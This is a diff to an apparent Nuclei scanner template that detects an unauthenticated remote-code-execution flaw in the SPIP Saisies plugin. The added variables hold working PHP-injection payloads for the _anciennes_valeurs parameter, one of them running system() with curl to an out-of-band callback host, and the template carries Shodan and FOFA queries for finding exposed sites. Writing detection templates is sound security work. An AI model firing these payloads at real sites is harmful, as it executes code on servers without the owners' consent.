@@ -1,69 +1,58 @@
 id: vt-2025-71243
 
 info:
-  name: SPIP Saisies Plugin - Unauthenticated RCE via Template Injection
+  name: SPIP Saisies Plugin - Unauthenticated RCE
   author: omarkurt
   severity: critical
   description: |
-    The Saisies plugin for SPIP (versions 5.4.0 through 5.11.0) allows
-    unauthenticated Remote Code Execution via PHP template injection in
-    the _anciennes_valeurs parameter. The underscore prefix bypasses
-    protege_champ() sanitization, and #ACTION_FORMULAIRE renders with
-    interdire_scripts=false, allowing arbitrary PHP code execution.
-  impact: |
-    Full remote code execution without authentication on any SPIP instance
-    running a vulnerable Saisies plugin version.
-  remediation: |
-    Update the Saisies plugin to version 5.11.1 or later.
+    The Saisies plugin for SPIP versions 5.4.0 through 5.11.0 allows unauthenticated
+    Remote Code Execution via PHP template injection in the _anciennes_valeurs parameter.
+    The parameter bypasses protege_champ() sanitization due to underscore prefix, and
+    #ACTION_FORMULAIRE renders with interdire_scripts=false, allowing PHP code execution.
   reference:
-    - https://nvd.nist.gov/vuln/detail/CVE-2025-71243
+    - https://vulnerability.circl.lu/vuln/cve-2025-71243
     - https://chocapikk.com/posts/2026/spip-saisies-rce/
     - https://github.com/Chocapikk/CVE-2025-71243
-    - https://blog.spip.net/Mise-a-jour-critique-de-securite-pour-le-plugin-Saisies.html
     - https://vulnerabletarget.com/VT-2025-71243
   classification:
     cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
     cvss-score: 9.8
-    cve-id: CVE-2025-71243
     cwe-id: CWE-94
   metadata:
     verified: true
-    max-request: 2
+    max-request: 4
     vendor: spip
     product: saisies
     shodan-query: 'http.html:"SPIP"'
     fofa-query: 'app="SPIP"'
-  tags: cve,cve2025,spip,saisies,rce,code-injection,unauth
+  tags: cve,cve2025,spip,saisies,rce,code-injection,unauth,oast,oob,interactsh
 
 variables:
-  marker: "{{rand_text_alphanumeric(12)}}"
+  rce_payload: "x'/><?php echo 'VT2025SPIPSAISIES'; ?><input value='x"
+  oob_payload: "x'/><?php gethostbyname('{{interactsh-url}}'); ?><input value='x"
+  oob_curl: "x'/><?php system('curl+-s+{{interactsh-url}}'); ?><input value='x"
 
 http:
-  # Step 1: In-band detection - PHP code execution with unique marker
+  # In-band detection via GET
   - method: GET
     path:
-      - "{{BaseURL}}/spip.php?page=contact&_anciennes_valeurs={{url_encode(\"x'/><\" + \"?php echo '\" + marker + \"'; ?\" + \"><input value='x\")}}"
+      - "{{BaseURL}}/spip.php?page=contact&_anciennes_valeurs={{url_encode(rce_payload)}}"
 
     matchers-condition: and
     matchers:
       - type: word
         part: body
         words:
-          - "{{marker}}"
+          - "VT2025SPIPSAISIES"
 
       - type: status
         status:
           - 200
 
-      - type: word
-        part: header
-        words:
-          - "text/html"
-
-  # Step 2: OOB confirmation via DNS callback
+  # Out-of-band detection via DNS
   - method: GET
     path:
-      - "{{BaseURL}}/spip.php?page=contact&_anciennes_valeurs={{url_encode(\"x'/><\" + \"?php gethostbyname('\" + interactsh-url + \"'); ?\" + \"><input value='x\")}}"
+      - "{{BaseURL}}/spip.php?page=contact&_anciennes_valeurs={{url_encode(oob_payload)}}"
 
     matchers-condition: and
     matchers:
@@ -75,3 +64,31 @@ http:
       - type: status
         status:
           - 200
+
+    extractors:
+      - type: dsl
+        dsl:
+          - "'DNS OOB interaction received from ' + interactsh_request"
+
+  # Out-of-band detection via HTTP
+  - method: GET
+    path:
+      - "{{BaseURL}}/spip.php?page=contact&_anciennes_valeurs={{url_encode(oob_curl)}}"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
+          - "dns"
+        condition: or
+
+      - type: status
+        status:
+          - 200
+
+    extractors:
+      - type: dsl
+        dsl:
+          - "'OOB RCE confirmed via ' + interactsh_protocol"
